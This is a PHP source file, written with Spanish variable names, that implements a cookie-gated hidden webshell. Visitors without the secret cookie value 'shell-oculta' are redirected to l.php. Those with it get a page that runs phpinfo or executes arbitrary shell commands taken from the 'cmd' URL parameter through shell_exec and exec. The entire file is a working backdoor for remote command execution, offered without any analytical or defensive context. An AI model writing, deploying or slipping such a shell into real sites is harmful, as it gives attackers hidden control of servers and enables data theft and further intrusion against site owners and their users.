<?php

$codigo_secreto = "shell-oculta";


if (isset($_COOKIE['oculto']))
{
    if ($_COOKIE['oculto'] == $codigo_secreto)
    {
        print "<html><head><title>Webshell</title></head>";
        print "<body><center>";
        print "<form method=\"get\" action=\"\">";
        print "<input type=\"submit\" name=\"ejecutar\" value=\"phpinfo\"/>";
        print "<input type=\"submit\" name=\"ejecutar\" value=\"shell_exec\"/>";
        print "<input type=\"submit\" name=\"ejecutar\" value=\"exec\"/>";
        print "</form>";
        if ($_GET['ejecutar'] == "phpinfo")
        {
            phpinfo();
        } elseif ($_GET['ejecutar'] == "shell_exec")
        {
            if (!isset($_GET['cmd']))
            {
                $_GET['cmd'] = "uname -a";
            }
            print "<form method=\"get\" action=\"\">";
            print "<input type=\"hidden\" name=\"ejecutar\" value=\"shell_exec\"/>";
            print "<input type=\"text\" name=\"cmd\" value=\"".htmlentities($_GET['cmd'])."\" style=\"width:75%\"/>";
            print "<input type=\"submit\" value=\"Enviar\"/>";
            print "</form>";
            $salida = shell_exec($_GET['cmd']);
            print "<textarea style=\"width:80%; height:66%;\">".htmlentities($salida)."</textarea>";
        }  elseif ($_GET['ejecutar'] == "exec")
        {
            if (!isset($_GET['cmd']))
            {
                $_GET['cmd'] = "uname -a";
            }
            print "<form method=\"get\" action=\"\">";
            print "<input type=\"hidden\" name=\"ejecutar\" value=\"exec\"/>";
            print "<input type=\"text\" name=\"cmd\" value=\"".htmlentities($_GET['cmd'])."\" style=\"width:75%\"/>";
            print "<input type=\"submit\" value=\"Enviar\"/>";
            print "</form>";
            $salida = exec($_GET['cmd']);
            print "<textarea style=\"width:80%; height:66%;\">".htmlentities($salida)."</textarea>";
        }
    } else
    {
        header('Location: l.php');
        exit;
    }
} else
{
    header('Location: l.php');
    exit;
}
?>
